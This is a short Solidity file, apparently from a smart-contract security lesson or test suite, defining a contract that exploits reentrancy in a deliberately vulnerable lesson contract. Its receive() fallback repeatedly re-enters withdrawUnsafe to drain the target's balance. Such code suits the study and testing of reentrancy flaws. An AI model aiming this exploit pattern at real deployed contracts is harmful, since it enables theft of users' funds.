// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {VulnerableEthReentrancyLesson} from "../../contracts/lessons/vulnerable/VulnerableEthReentrancyLesson.sol";

contract ReentrancyAttacker {
    VulnerableEthReentrancyLesson public immutable target;
    uint256 public hits;

    constructor(VulnerableEthReentrancyLesson t) {
        target = t;
    }

    function attack(uint256 amount) external payable {
        target.deposit{value: amount}();
        target.withdrawUnsafe(amount);
    }

    receive() external payable {
        if (hits < 100 && address(target).balance > 0) {
            ++hits;
            uint256 bal = target.balances(address(this));
            if (bal > 0) {
                uint256 w = bal > 1 ether ? 1 ether : bal;
                target.withdrawUnsafe(w);
            }
        }
    }
}
